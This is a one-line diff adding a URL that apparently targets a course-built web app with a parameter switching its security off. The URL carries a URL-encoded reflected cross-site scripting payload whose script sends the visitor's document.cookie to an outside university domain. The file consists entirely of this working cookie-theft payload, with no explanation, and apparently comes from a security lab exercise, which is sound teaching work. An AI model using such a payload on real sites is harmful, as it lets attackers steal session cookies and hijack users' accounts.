@@ -1,0 +1,1 @@
+https://sigurnost-mmi9.onrender.com/actionsubmit?sigurnost=safeOff&upit=%3Cscript%3Ewindow.location%3D%22http%3A%2F%2Fwww.fer.unizg.hr%3Fcookie%3D%22%2Bdocument.cookie%3C%2Fscript%3E
